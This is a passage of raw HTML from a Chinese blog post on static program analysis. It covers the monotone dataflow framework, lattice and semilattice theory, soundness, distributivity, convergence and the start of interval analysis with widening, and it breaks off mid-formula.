style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">MEE</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></p></li><li><p>如果某个结点的后继结点发生了变化，则使用结点更新运算更新该结点的值。</p></li><li><p>如果没有任何结点的值发生变化，则程序终止。</p></li></ol><p>活跃变量分析需要考虑 <strong>sound</strong> 和 <strong>Convergence</strong>，也即严格满足 may 分析，活跃变量集合包含所有可能的活跃变量；活跃变量分析的算法需要收敛。</p><h1>单调框架</h1><p>为了确保符号分析和活跃变量分析的收敛性和正确性，提出了<strong>数据流分析的单调框架</strong>，通过一个通用的可定义的框架，囊括数据流分析基本流程，并且检验每一步的状态转换函数和参数。一般而言，单调框架会涉及到</p><ul><li>设置节点对应的不同类型集合的统一接口。</li><li>设置节点转换函数的统一接口。</li></ul><p>在开始之前，读者需要明白以下数学内容。</p><h1>格理论基础简介</h1><p>格（Lattice）是其非空有限子集都有一个上确界（称为<strong>并</strong>）和一个<a href="https://zh.wikipedia.org/wiki/%E4%B8%8B%E7%A1%AE%E7%95%8C">下确界</a>（称为**交）的<a href="https://zh.wikipedia.org/wiki/%E5%81%8F%E5%BA%8F%E9%9B%86%E5%90%88">偏序集合</a>（poset）。如果学习过离散数学，那么知道偏序关系是对于 “大于” 或者 “小于” 关系的抽象。</p><p>先复习二元关系性质的内容，R(x, y) 表示 x, y 满足关系 R</p><ul><li>自反性。对于集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> 上的<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%85%83%E5%85%B3%E7%B3%BB">二元关系</a> R，若满足：取 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> 里任一元素 a，且满足对于所有 a 皆存在 (a,a) 在 R 集合中，则称二元关系 R 是<strong>自反的</strong>，或称 R 具有<strong>自反性</strong>，或称 R 为<strong>自反关系</strong>。例如 a &gt;= a。</li><li>反自反性。若集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> 上的二元关系为非对称关系，则</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><mi>X</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>R</mi><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>∉</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">a,b\in X,(a,b)\in R\implies (b,a)\not \in R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7073em;vertical-align:-0.024em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></span></p><p>例如 a&gt;b，那么就不会有 b&gt;a。</p><ul><li><p>对称性。若集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 上的二元关系为非对称关系，则对于所有$ (a,b)\in R\implies (b,a) \in R$。</p></li><li><p>传递性。数学上表示为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo>∈</mo><mi>X</mi><mo separator="true">,</mo><mtext> </mtext><mi>a</mi><mi>R</mi><mi>b</mi><mo>∧</mo><mi>b</mi><mi>R</mi><mi>c</mi><mtext>  </mtext><mo>⇒</mo><mi>a</mi><mi>R</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">\forall a,b,c\in X,\ aRb\land bRc\;\Rightarrow aRc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">∀</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">c</span></span></span></span></span></p><p>例如：<strong>大于等于</strong>具有传递关系：若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>⩾</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a\geqslant b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>⩾</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">b\geqslant c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span> 则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>⩾</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">b\geqslant c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></p></li></ul><h2 id="半格-semilattice">半格 semilattice</h2><img src="https://cdn.blog-blockchain.xyz/202204110017956.png" alt="image-20220411001735705" style="zoom: 50%;" /><p>如果理解了「群、环、域」这些近世代数的基本内容，可以很容易的理解这些抽象定义。我们<strong>开始理解格和数据流分析的关系</strong>。在前面经常提到「抽象」这个词，比如对于具体的符号 <code>+</code>、<code>-</code>，在某个节点中可能同时出现，那么用更加抽象的符号 <code>T</code> 表示。其实，这里的 <code>T</code> 相当于格中的最大元。每一步的抽象类似于偏序关系，构造不同抽象层次的符号集。</p><p>**半格的高度：**偏序图的层次数，也等同于半格的偏序图中任意两个结点的最大距离+1。例如下面的偏序图，半格高度为 3<br><img src="https://cdn.blog-blockchain.xyz/202204110029312.png" alt="image-20220411002927120" style="zoom: 50%;" /></p><h2 id="单调框架的基本流程">单调框架的基本流程</h2><p>在有了以上的知识后，我们给出概括性的基本流程：</p><ol><li>构建控制流图 (V, E)。请回忆前面我们规定每个语句处视作状态，状态用节点表示，状态之间的联系用节点之间的边表示。</li><li>一个有限高度的半格(𝑆,⊓)。「有限」表示控制流会终止，也表示数据流分析收敛。S 表示状态的集合，例如判断数值正负的符号集合，那么 S 包括 {+, -, T}。⊓ 则定义了控制语句交汇处状态汇总的规则。</li><li>一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">entry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">ry</span></span></span></span> 的初值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span>。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">entry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">ry</span></span></span></span> 表示初始输入，不同的输入，程序的收敛性和正确性可能不一样。</li><li>一组单调的节点转换函数，对除了入口的任意节点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mo>∈</mo><mi>V</mi><mo>−</mo><mi>e</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">v\in V-entry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">ry</span></span></span></span> 存在一个 单调函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">f_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。除了初始输入，我们对于每个状态的抽象层次(例如上面提到的 零 正 负和 T。大于表示超集)，使用偏序关系进行排序。采用单调函数以保证偏序关系。</li></ol><p>下面是伪代码实现：</p><img src="https://cdn.blog-blockchain.xyz/202204110044693.png" alt="image-20220411004452475" style="zoom: 50%;" /><ol><li>程序入口赋初值为 I</li><li>除了初始位置的其他节点都赋予默认值 T</li><li>初始化未访问的节点集合</li><li>如果未访问的节点数量大于 0，那么<ol><li>从未访问的节点中选取一个节点 v</li><li>在未访问节点集合中删除节点 v</li><li>交汇节点 v 的每个前驱节点 w, 确定交汇操作。</li><li>如果节点交汇操作输入到节点 v 的状态转移函数后，导致节点 v 的值之前值不同，则更新他的后继节点。</li><li>覆盖节点 v 原来的状态</li></ol></li></ol><p>从上面的流程可以看出来，选取的开始的节点，并不是从初始输入的程序入口处开始执行，这其实是出于考虑状态转换时可能存在特殊的节点，执行到它们后，根据前面提到的规则，可能无法向前驱节点传递状态改变。</p><h1>小结</h1><img src="https://cdn.blog-blockchain.xyz/202204110106617.png" alt="image-20220411010651253" style="zoom:67%;" /><h1>数据流分析的性质</h1><h2 id="最大下界">最大下界</h2><p>这一般会在离散数学中学习，在偏序集合中(允许大于等于)，对于某个子集的最大下界，是所有不大于它的元素中的最大元。如下图举例（默认读者理解哈斯图）：如果找 d, e 的最大下界，d,e 的下界有 a,b,c。然后找 a, b, c 中的最大元，由于 a, b, c 没有最大元，所以不存在最大下界。但是如果找 {d, e, b} 最大下界，可以明显的知道是 b。</p><p><img src="http://cdn.blog-blockchain.xyz/202210042236003.jpeg" alt=""></p><p>严格定义可以参考下图：</p><img src="https://cdn.blog-blockchain.xyz/202208052315970.png" alt="image-20220805231533889" style="zoom: 50%;" /><p>可以看出，半格是特殊的偏序关系，所有元素都存在“大小关系”。</p><h2 id="数据流分析的安全性">数据流分析的安全性</h2><p>安全性体现为保持 sound，也就是不会出现 false positive 但是可能出现 false negative。交汇的操作后的值会比单独的每一条路径在此节点的值更小。这里嵌套的状态转移函数表示从入口到节点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的状态转移过程。严格的定义如下：</p><img src="https://cdn.blog-blockchain.xyz/202208052328885.png" alt="image-20220805232859815" style="zoom:50%;" /><p>如果考虑到路径上的节点其实也可能进行了交汇操作，上面的结论是否还是成立呢？其实只要满足前面小节中变化函数是单调函数，而且交汇函数形成半格即可。详细说明如下：</p><img src="https://cdn.blog-blockchain.xyz/202208052339826.png" alt="image-20220805233917750" style="zoom:50%;" /><h2 id="数据流分析的分配性">数据流分析的分配性</h2><p>分配性是为了克服 false negative 提出的。<strong>分配性的定义</strong>：一个数据流分析满足分配性，如果</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>v</mi><mo>∈</mo><mi>V</mi><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>S</mi><mo>:</mo><msub><mi>f</mi><mi>v</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊓</mo><msub><mi>f</mi><mi>v</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mi>v</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo>⊓</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\forall v \in V, x, y \in S: f_{v}(x) \sqcap f_{v}(y)=f_{v}(x \sqcap y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p><p>可以发现，安全性可以理解为右边小于等于左边。可以通过集合运算验证是否满足分配性，注意观察下面的结果是等号而不是被包含，另外要理解即使满足了分配性，数据流分析可能还是近似的，因为节点的状态转换函数还是可能是近似的。我们略过证明过程。</p><img src="https://cdn.blog-blockchain.xyz/202208061703080.png" alt="image-20220806170300963" style="zoom:50%;" /><h2 id="数据流分析的收敛性">数据流分析的收敛性</h2><p>由于数据流分析的基本原理是交汇操作和节点转换函数，再结合基本条件中节点转换函数必须是单调的，因此随着路径地加深，而半格高度有限，必然会逐渐收敛。可以证明，收敛到不动点，且它一定是最大的不动点。</p><img src="https://cdn.blog-blockchain.xyz/202208061716553.png" alt="image-20220806171659475" style="zoom: 67%;" /><h1>widening and narrowing</h1><p>它的提出是为了解决数据流分析的复杂性，太过复杂会导致收敛速度极慢。</p><h2 id="区间分析">区间分析</h2><p>以区间分析为例：</p><img src="https://cdn.blog-blockchain.xyz/202208061734290.png" alt="image-20220806173421224" style="zoom: 67%;" /><p>可以想到的是，如果正向进行，变量的范围应当是逐渐扩大的，即交汇操作满足 $$[a, b] \sqcap[c, d]=[\min (a, c), \max (b, d)]$$变换函数表示这条语句自身导致变量的变化，例如加上一个变量或者变量组合。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>+</mo><mo stretchy="false">[</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>a</mi><mo>+</mo><mi>c</mi><mo separator="true">,</mo><mi>b</mi><mo>+</mo><mi>d</mi><mo stretchy="false">]</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>−</mo><mo stretchy="false">[</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>a</mi><mo>−</mo><mi>d</mi><mo separator="true">,</mo><mi>b</mi><mo>−</mo><mi>c</mi><mo stretchy="false">]</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}&amp;{[a, b]+[c, d]=[a+c, b+d]} \\&amp;{[a, b]-[c, d]=[a-d, b-c]}\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.75em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">[</span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">d</span><span class="mclose">]</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">[</span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord 